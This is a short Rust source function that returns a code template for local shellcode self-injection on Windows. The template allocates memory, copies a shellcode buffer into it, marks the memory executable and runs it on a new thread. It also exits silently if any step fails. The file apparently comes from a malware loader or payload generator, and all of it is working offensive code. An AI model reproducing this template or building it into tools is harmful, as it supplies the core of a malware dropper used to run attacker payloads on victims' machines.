pub fn local_crt_snippet() -> String {
    r#"    // Injection: Local CreateThread (self-inject)
    {
        use windows_sys::Win32::System::Memory::*;
        use windows_sys::Win32::System::Threading::*;
        use windows_sys::Win32::Foundation::*;
        use std::ffi::c_void;

        let addr = unsafe {
            VirtualAlloc(
                std::ptr::null(),
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        if addr.is_null() { std::process::exit(0); }

        unsafe {
            std::ptr::copy_nonoverlapping(
                shellcode.as_ptr(),
                addr as *mut u8,
                shellcode.len(),
            );
        }

        let mut old_protect = 0u32;
        unsafe {
            VirtualProtect(
                addr,
                shellcode.len(),
                PAGE_EXECUTE_READ,
                &mut old_protect,
            );
        }

        let thread = unsafe {
            CreateThread(
                std::ptr::null(),
                0,
                Some(std::mem::transmute(addr)),
                std::ptr::null(),
                0,
                std::ptr::null_mut(),
            )
        };
        if thread.is_null() {{ std::process::exit(0); }}
        unsafe {
            WaitForSingleObject(thread, u32::MAX);
            CloseHandle(thread);
        }
    }"#
    .to_string()
}
